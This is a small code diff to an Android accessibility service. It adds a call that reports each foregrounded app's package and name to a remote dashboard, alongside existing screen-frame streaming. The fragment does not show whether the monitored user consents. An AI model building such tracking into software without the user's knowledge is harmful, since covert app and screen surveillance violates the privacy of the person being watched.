@@ -214,6 +214,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     try {
                         SocketManager smWin = SocketManager.getInstance(this);
                         smWin.getAppMonitor().onAppForeground(packageName);
+                        // Push recent activity to dashboard
+                        if (smWin.isConnected() && packageName != null && !packageName.isEmpty()) {
+                            smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
+                        }
                         // Push a frame so dashboard sees the new screen
                         if (smWin.isStreamingActive()) {
                             smWin.scheduleFrameAfterAction(
